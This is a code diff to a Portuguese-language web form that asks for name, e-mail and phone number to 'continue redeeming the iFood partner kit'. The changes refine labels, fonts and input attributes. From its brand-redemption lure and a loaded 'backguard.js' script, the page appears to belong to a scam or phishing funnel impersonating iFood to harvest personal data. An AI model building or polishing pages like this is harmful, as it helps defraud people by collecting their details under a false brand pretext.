@@ -12,8 +12,9 @@
     <meta name="description" content="Informe seus dados para continuar o resgate do kit parceiro iFood.">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="style.css?v=3.2">
+    <link rel="stylesheet" href="dados.css?v=1">
 <script src="/backguard.js?v=1.5"></script>
 </head>
 
@@ -31,14 +32,14 @@
     <main class="container">
         <section class="step" aria-hidden="false">
             <div class="step-header">
-                <span class="step-count">Seus Dados</span>
+                <span class="step-count">Dados pessoais</span>
                 <div class="progress-bar">
                     <div class="progress" style="width: 55%"></div>
                 </div>
             </div>
 
-            <h2>Dados de Identificação</h2>
-            <p>Informe seu nome, e-mail e telefone para continuar.</p>
+            <h2>Vamos conhecer você</h2>
+            <p>Preencha seus dados para continuar.</p>
 
             <div id="personal-error" class="form-error hidden" role="alert"></div>
 
@@ -46,18 +47,18 @@
                 <div class="input-group">
                     <input type="text" id="fullname" class="floating-input" placeholder=" " required
                         autocomplete="name" spellcheck="false">
-                    <label for="fullname" class="floating-label">Nome Completo</label>
+                    <label for="fullname" class="floating-label">Nome completo</label>
                 </div>
 
                 <div class="input-group">
-                    <input type="email" id="email" class="floating-input" placeholder=" " required autocomplete="email">
+                    <input type="email" id="email" class="floating-input" placeholder=" " required autocomplete="email" autocapitalize="none" spellcheck="false">
                     <label for="email" class="floating-label">E-mail</label>
                 </div>
 
                 <div class="input-group">
                     <input type="tel" id="phone" class="floating-input" placeholder=" " maxlength="15" inputmode="numeric"
                         autocomplete="tel" required>
-                    <label for="phone" class="floating-label">Telefone</label>
+                    <label for="phone" class="floating-label">Telefone com DDD</label>
                 </div>
 
                 <div class="action-stack">
